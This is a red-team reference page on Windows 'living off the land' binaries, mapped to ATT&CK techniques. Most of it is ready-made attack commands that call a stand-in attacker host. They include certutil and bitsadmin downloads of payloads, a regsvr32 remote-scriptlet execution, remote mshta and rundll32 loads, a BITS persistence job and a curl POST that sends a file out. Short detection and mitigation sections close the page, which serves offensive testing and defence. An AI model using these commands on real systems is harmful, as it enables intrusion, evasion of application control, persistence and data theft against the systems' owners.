% Filename: 06-red-teaming/evasion/windows-lolbins.md
% Display name: Windows LOLBins
% Last update: 2026-02-11
% ATT&CK Tactics: TA0005 (Defense Evasion), TA0011 (Command and Control)
% ATT&CK Techniques: T1218 (System Binary Proxy Execution), T1105 (Ingress Tool Transfer)
% Authors: @TristanInSec

# Windows LOLBins

## Overview

Living Off the Land Binaries (LOLBins) are legitimate, Microsoft-signed system binaries that can be repurposed for offensive operations. Because they are trusted OS components, they bypass application control policies, blend in with normal system activity, and avoid suspicion in process logs. Red teams use LOLBins for code execution, file downloads, lateral movement, and data exfiltration.

## ATT&CK Mapping

- **Tactic:** TA0005 - Defense Evasion
- **Technique:** T1218 - System Binary Proxy Execution
- **Tactic:** TA0011 - Command and Control
- **Technique:** T1105 - Ingress Tool Transfer

## Techniques

### Code Execution

```text
Binary          Technique                                    ATT&CK
──────────────  ───────────────────────────────────────────  ─────────
MSBuild.exe     Execute inline C# from .csproj file          T1127.001
InstallUtil.exe Execute .NET assembly via installer class     T1218.004
Regsvr32.exe    Execute remote .sct scriptlet                T1218.010
MSHTA.exe       Execute HTA with VBScript/JScript            T1218.005
Rundll32.exe    Execute DLL exports or JavaScript            T1218.011
CMSTP.exe       Execute commands via .inf file               T1218.003
Certutil.exe    Decode and execute embedded payloads         T1140
Wmic.exe        Execute XSL files with JScript               T1220
Forfiles.exe    Execute commands via file search             T1202
Pcalua.exe      Execute arbitrary programs                   T1202
```

### MSBuild.exe (T1127.001)

```bash
# Microsoft Build Engine — compiles and executes inline C# tasks
# Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe

# Execute a .csproj file containing inline C# shellcode loader
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj

# Can execute without touching disk if .csproj is fetched via a download cradle
# See AppLocker Bypass for .csproj template
```

### Certutil.exe (T1140)

```bash
# Certificate utility — can download files and decode base64
# Path: C:\Windows\System32\certutil.exe

# Download a file from a URL
certutil -urlcache -split -f http://<attacker_ip>/payload.exe C:\Windows\Tasks\payload.exe

# Encode a file to base64
certutil -encode payload.exe payload.b64

# Decode a base64 file back to binary
certutil -decode payload.b64 payload.exe

# Download and decode in one step:
# 1. Host base64-encoded payload
# 2. certutil -urlcache -split -f http://<attacker_ip>/payload.b64 C:\Windows\Tasks\payload.b64
# 3. certutil -decode C:\Windows\Tasks\payload.b64 C:\Windows\Tasks\payload.exe
```

### Regsvr32.exe (T1218.010)

```bash
# COM object registration — can load remote scriptlets
# Path: C:\Windows\System32\regsvr32.exe

# Execute a remote .sct scriptlet (Squiblydoo attack)
regsvr32 /s /n /u /i:http://<attacker_ip>/payload.sct scrobj.dll

# Flags:
#   /s    — silent (no dialog boxes)
#   /n    — do not call DllRegisterServer
#   /u    — unregister (triggers DllUnregisterServer logic in .sct)
#   /i:   — specify the .sct URL

# The .sct file contains JScript or VBScript that executes on the target
```

### MSHTA.exe (T1218.005)

```bash
# HTML Application Host — executes .hta files
# Path: C:\Windows\System32\mshta.exe

# Execute a remote HTA file
mshta http://<attacker_ip>/payload.hta

# Execute inline VBScript
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd /c whoami > C:\Windows\Tasks\out.txt"":close")

# Execute inline JScript
mshta javascript:a=new%20ActiveXObject("WScript.Shell");a.Run("cmd /c whoami");close();
```

### Rundll32.exe (T1218.011)

```bash
# DLL host process — runs exported DLL functions
# Path: C:\Windows\System32\rundll32.exe

# Execute a DLL export
rundll32.exe payload.dll,DllMain

# Execute JavaScript (abuse)
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell");h.Run("cmd /c whoami");

# Load a DLL from a UNC path (lateral movement)
rundll32.exe \\<attacker_ip>\share\payload.dll,EntryPoint
```

### CMSTP.exe (T1218.003)

```bash
# Connection Manager Profile Installer
# Path: C:\Windows\System32\cmstp.exe

# Execute commands via a malicious .inf file
cmstp.exe /s /ns C:\path\to\payload.inf

# The .inf file contains a RunPreSetupCommandsSection that executes commands
# Can bypass UAC when run from certain contexts
```

### File Downloads

```text
Binary          Command
──────────────  ─────────────────────────────────────────────────────────────
certutil.exe    certutil -urlcache -split -f <url> <output>
bitsadmin.exe   bitsadmin /transfer job /download /priority high <url> <output>
PowerShell      powershell -c "(New-Object Net.WebClient).DownloadFile('<url>','<output>')"
curl.exe        curl -o <output> <url>
Expand.exe      expand \\<unc_path>\file.cab <output>
esentutl.exe    esentutl /y \\<unc_path>\file /d <output> /o
```

### BITSAdmin.exe (T1197)

```bash
# Background Intelligent Transfer Service — Windows update mechanism
# Path: C:\Windows\System32\bitsadmin.exe

# Download a file
bitsadmin /transfer job /download /priority high http://<attacker_ip>/payload.exe C:\Windows\Tasks\payload.exe

# BITS jobs persist across reboots and run as SYSTEM
# Can also be used for persistence by creating notification commands

# Create a BITS job with a command that runs on completion
bitsadmin /create persistjob
bitsadmin /addfile persistjob http://<attacker_ip>/payload.exe C:\Windows\Tasks\payload.exe
bitsadmin /SetNotifyCmdLine persistjob C:\Windows\Tasks\payload.exe NULL
bitsadmin /resume persistjob
```

### Reconnaissance

```text
Binary          Use
──────────────  ─────────────────────────────────────────────
nltest.exe      nltest /dclist:<domain> — enumerate domain controllers
dsquery.exe     dsquery user -name * -limit 0 — enumerate AD users
net.exe         net user /domain — enumerate domain users
whoami.exe      whoami /all — current user context and privileges
systeminfo.exe  systeminfo — OS version, patches, domain
tasklist.exe    tasklist /v — running processes
ipconfig.exe    ipconfig /all — network configuration
netstat.exe     netstat -ano — active connections and listeners
arp.exe         arp -a — ARP cache (local subnet hosts)
route.exe       route print — routing table
```

### Lateral Movement

```text
Binary            Use
────────────────  ─────────────────────────────────────────────
PsExec.exe        Remote command execution via SMB (Sysinternals)
sc.exe            sc \\target create svc binpath= "cmd /c ..." — remote service
schtasks.exe      schtasks /create /s <target> /tn task /tr <cmd> — remote scheduled task
wmic.exe          wmic /node:<target> process call create "cmd.exe /c ..."
winrs.exe         winrs -r:<target> cmd — WinRM command execution
mstsc.exe         RDP client
```

### Data Exfiltration

```text
Binary          Technique
──────────────  ─────────────────────────────────────────────
certutil.exe    certutil -encode <file> <output.b64> — encode before exfil
makecab.exe     makecab <file> <output.cab> — compress before exfil
compact.exe     compact /c /s:<dir> — NTFS compression
tar.exe         tar -cf archive.tar <dir> — archive (Windows 10+)
curl.exe        curl -X POST -d @<file> http://<attacker> — exfil via HTTP POST
```

## Detection Methods

### Host-Based Detection

- Unusual parent-child process relationships (e.g., mshta.exe spawning cmd.exe)
- LOLBins executing with command-line arguments containing URLs or encoded data
- certutil.exe with `-urlcache` or `-decode` flags
- MSBuild.exe loading .csproj files from user-writable directories
- regsvr32.exe making outbound network connections
- Process creation logs (Event ID 4688) with full command-line auditing

### Behavioral Detection

- LOLBins used outside their normal operational context
- Network connections from binaries that typically don't need internet access
- File writes to temp directories by system utilities

## Mitigation Strategies

- **Windows Defender Application Control (WDAC)** — restrict which signed binaries can execute
- **Attack Surface Reduction (ASR) rules** — block specific LOLBin abuse patterns
- **AppLocker deny rules** — block execution of known-abused LOLBins from user paths
- **Command-line logging** — Event ID 4688 with full command-line auditing
- **EDR behavioral rules** — alert on LOLBins with suspicious arguments

## References

### Official Documentation

- [LOLBAS Project](https://lolbas-project.github.io/)

### MITRE ATT&CK

- [T1218 - System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218/)
- [T1105 - Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)
